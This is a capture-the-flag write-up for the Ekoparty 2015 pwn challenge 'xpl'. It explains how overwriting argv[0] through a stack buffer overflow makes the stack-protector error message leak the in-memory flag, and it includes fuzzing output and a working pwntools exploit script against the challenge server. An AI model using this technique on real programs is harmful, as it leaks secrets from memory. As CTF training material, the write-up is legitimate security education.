[](ctf=ekoparty-pre-ctf-2015)
[](type=pwn)
[](tags=buffer-overflow)

Again we are given a [zip](../pwn100.zip)
Extracting it gives us [xpl](../xpl) executable.

```bash
$ file xpl 
xpl: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1856a84cc2663caa91e1511a2f0691652201fb95, not stripped

./xpl
Interesting data loaded at 0x7fff3a9971a0
Your username? aa
```
Doing a checksec shows us
```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Strange! NX enabled, we can't execute a shell code. Lets debug the binary.
We create a fake flag.txt and run it. 

Interesting data loaded at 0x7fff3a9971a0
When we inspect the address we see that it contains the contents of flag.txt i.e our fake flag.

Also when we give a long string as username, it crashes.
```bash
$ ./xpl
Interesting data loaded at 0x7fffab63c4c0
Your username? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: ./xpl terminated
Aborted
```
[This](http://seclists.org/bugtraq/2010/Apr/243) bugtraq post discusses a method to turn fortify into an attacker aid and use it to leak strings into the error output it prints. If we can manage to overwrite the argv[0] pointer we can leak any string for which we know the address.

Perfect! we know the address of our flag and now our payload should be somewhat of the form 'A'*n+address(flag) and it would spew out our flag.
Quick fuzzing with [fuzz.py](../fuzz.py)
```bash
$ python fuzz.py > fuzz.txt
$ cat fuzz.txt | grep `cat flag.txt`
376 Your username? *** stack smashing detected ***: AAAA
```
n=376
Now for the final exploit, little changes in [fuzz.py](../fuzz.py)
```python
from pwn import *
from time import sleep
for i in range(376,377):
	#sh=process('./xpl')
	sh=remote('challs.ctf.site',20001)
	a=sh.recvline()
	sh.send('A'*i+p64(int(a.split()[4],16)))
	print i,a
	try:
		print sh.recvline()
	except:
		print i
	sleep(0.1)
```
gives
> 376  Interesting data loaded at 0x7fffffffe540
Your username? *** stack smashing detected ***: EKO{pwning_stack_protector}


Flag
>EKO{pwning_stack_protector}